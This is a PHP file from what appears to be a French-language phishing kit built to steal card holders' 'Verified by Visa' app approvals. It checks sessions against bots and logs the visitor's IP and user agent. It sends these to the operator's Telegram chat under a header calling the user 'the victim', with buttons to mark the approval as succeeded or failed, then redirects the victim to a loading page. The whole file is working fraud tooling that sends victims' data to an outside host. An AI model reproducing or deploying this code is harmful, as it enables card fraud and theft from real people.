<?php
session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';
validateSession(4);

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// --- DYNAMIC LINK GENERATION ---
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$current_dir = dirname($_SERVER['PHP_SELF']); 
$root_dir = dirname($current_dir); 

if ($root_dir == '/' || $root_dir == '\\') $root_dir = ''; 

$base_url = $protocol . "://" . $host . $root_dir;

$vbv_action_url = $base_url . "/security_check/actionsvbv.php";
$vbv_action_url = str_replace('//security_check', '/security_check', $vbv_action_url);

$encoded_ip = urlencode($ip);

$link_valid = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=appvalid";
$link_bad   = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=appbad";

$message = "<b>📱 VBV APPLI VALIDÉ PAR LA VICTIME</b>\n";
$message .= "├ 🌐 IP: <code>$ip</code>\n";
$message .= "└ 📱 User-Agent: <code>$user_agent</code>\n";
$message .= "\n<b>Action requise :</b>";

// KEYBOARD
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ VALIDÉ (SUCCÈS)', 'url' => $link_valid],
            ['text' => '❌ REFUSÉ (ERREUR)', 'url' => $link_bad]
        ]
    ]
];

sendTelegramMessage($botToken, $chatId, $message, $keyboard);

// Log "wait" status to reset the IP state
file_put_contents('../security_check/ip_list.txt', "\n" . $ip . ",appwait", FILE_APPEND);

// Redirect to loading page
header('Location: ../validation.php'); exit();
?>
